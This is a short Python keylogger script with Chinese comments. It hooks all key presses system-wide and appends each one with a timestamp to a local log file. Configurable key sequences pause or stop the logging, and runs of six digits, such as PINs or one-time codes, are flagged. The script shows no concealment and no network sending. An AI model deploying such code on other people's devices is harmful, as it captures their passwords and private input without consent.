#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Date    : 2024/06/10
# @Author  : Kissablecho
# @FileName: Keyboard monitoring.py
# @Software: Visual Studio Code
# @Blog    ：https://blog.csdn.net/y223421
# @Github  : https://github.com/God-2077

from datetime import datetime
import keyboard
from configparser import ConfigParser, NoSectionError, NoOptionError
import signal
import sys
import os
import time

# 获取当前脚本的路径
current_script_path = os.path.abspath(__file__)

# 获取当前工作目录的路径
current_working_directory = os.getcwd()

fnfe = False
nse = False
noe = False

# 开始时间
starttime = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
print("-----------------------------------------------------")
print("start in: " + starttime)
print("脚本的路径: " + current_script_path)
print("工作目录的路径: " + current_working_directory)

# 读取 config.ini 配置文件
conf = ConfigParser()  # 需要实例化一个 ConfigParser 对象

config = os.path.join(os.path.dirname(current_script_path), 'config.ini')

try:
    # 检查配置文件是否存在
    if not os.path.exists(config):
        foundstate = False
        raise FileNotFoundError(f"配置文件 {config} 不存在")
    print(f"配置文件路径: {config}")
    foundstate = True
    conf.read(config, encoding='utf-8') 
    if 'config' not in conf:
        raise NoSectionError('config')
    
    keypath = conf.get('config', 'file', fallback='Keyboard.txt')
    wait_sequence = conf.get('config', 'wait', fallback='654321')
    wait_time = conf.getint('config', 'waittime', fallback=300)
    exit_sequence = conf.get('config', 'exit', fallback='qqqwe')

except FileNotFoundError as e:
    print(f"错误: {e}")
    fnfe = True
    keypath = os.path.join(os.path.dirname(current_script_path), 'Keyboard.txt')
    wait_sequence = '654321'
    wait_time = 300
    exit_sequence = 'qqqwe'

except NoSectionError as e:
    print(f"错误: 配置文件中缺少 {e.section} 部分")
    nse = True
    keypath = os.path.join(os.path.dirname(current_script_path), 'Keyboard.txt')
    wait_sequence = '654321'
    wait_time = 300
    exit_sequence = 'qqqwe'

except NoOptionError as e:
    print(f"错误: 配置文件中缺少 {e.option} 选项")
    noe = True
    keypath = os.path.join(os.path.dirname(current_script_path), 'Keyboard.txt')
    wait_sequence = '654321'
    wait_time = 300
    exit_sequence = 'qqqwe'

# 打开文件
f = open(keypath, 'a', encoding='utf-8')

print(f"键盘记录文件路径: {keypath}")

print("-----------------------------------------------------", file=f)
print("start in: " + starttime, file=f)
print("脚本的路径: " + current_script_path, file=f)
print("工作目录的路径: " + current_working_directory, file=f)
print(f"键盘记录文件路径: {keypath}", file=f)

if foundstate == True:
    print(f"配置文件路径: {config}", file=f)
else:
    print("配置文件 Not Found !!!")

if fnfe == True :
    print(f"错误: {e}", file=f)

if nse == True:
    print(f"错误: 配置文件中缺少 config 部分", file=f)

if noe == True:
    print(f"错误: 配置文件中缺少 file 选项", file=f)

# 写入文件
f.flush()

# 缓冲区用于检测键盘输入序列
input_buffer = []
input_buffertwo = []
number_buffer = []

# main
def on_key(event):
    global input_buffer
    global input_buffertwo
    global number_buffer
    localtime = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
    print(localtime, ":", event.name)
    print(localtime, ":", event.name, file=f)

    # 写入文件
    f.flush()

    # 检测键盘输入并添加到缓冲区
    input_buffer.append(event.name)
    
    # 如果缓冲区长度超过待检测序列长度，则删除最早的输入
    if len(input_buffer) > len(wait_sequence):
        input_buffer.pop(0)
    
    # 检查缓冲区内容是否与待检测序列匹配
    if ''.join(input_buffer) == wait_sequence:
        print(f"检测到输入序列 {wait_sequence}，暂停 {wait_time} 秒")
        print(f"检测到输入序列 {wait_sequence}，暂停 {wait_time} 秒", file=f)
        f.flush()
        time.sleep(wait_time)    
    
    # 检测退出序列
    input_buffertwo.append(event.name)
    
    # 如果缓冲区长度超过待检测序列长度，则删除最早的输入
    if len(input_buffertwo) > len(exit_sequence):
        input_buffertwo.pop(0)
    
    # 检查缓冲区内容是否与待检测序列匹配
    if ''.join(input_buffertwo) == exit_sequence:
        print(f"检测到输入序列 {exit_sequence}，exiting...")
        print(f"检测到输入序列 {exit_sequence}，exiting...", file=f)
        f.flush()
        sys.exit(0)

    # 检测连续6个数字输入
    if event.name.isdigit():
        number_buffer.append(event.name)
        if len(number_buffer) > 6:
            number_buffer.pop(0)
        if len(number_buffer) == 6:
            print("number")
            print("number", file=f)
            f.flush()
    else:
        number_buffer.clear()

def signal_handler(sig, frame):
    exittime = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
    print(exittime + ": " "检测到Ctrl+C, exiting...")
    print(exittime + ": " "检测到Ctrl+C, exiting...", file=f)
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
keyboard.on_press(on_key)
keyboard.wait()
